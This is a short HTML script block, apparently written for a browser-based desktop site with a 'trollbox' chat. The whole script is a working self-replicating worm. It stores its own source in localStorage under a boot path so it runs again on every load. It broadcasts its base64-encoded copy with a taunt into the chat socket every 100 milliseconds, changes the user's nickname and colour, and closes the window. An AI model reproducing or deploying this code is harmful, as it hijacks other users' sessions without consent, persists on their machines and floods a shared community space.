<script type="text/javascript">
(q=_=>{localStorage['boot/q.js']=`(q=${q})()`;setInterval(_=>{f=document.querySelector('iframe[src*=trollbox]');if(f&&f.contentWindow.socket){f.contentWindow.socket.emit('message','Suck it System.,'+btoa(`(q=${q})()${f.contentWindow.a?' ':''}`));f.contentWindow.a=!f.contentWindow.a}},100)})()
$store.set('.config/trollbox/nick', 'WIN32s');
$store.set('.config/trollbox/color', 'green');
$window.current.destroy();  
</script>
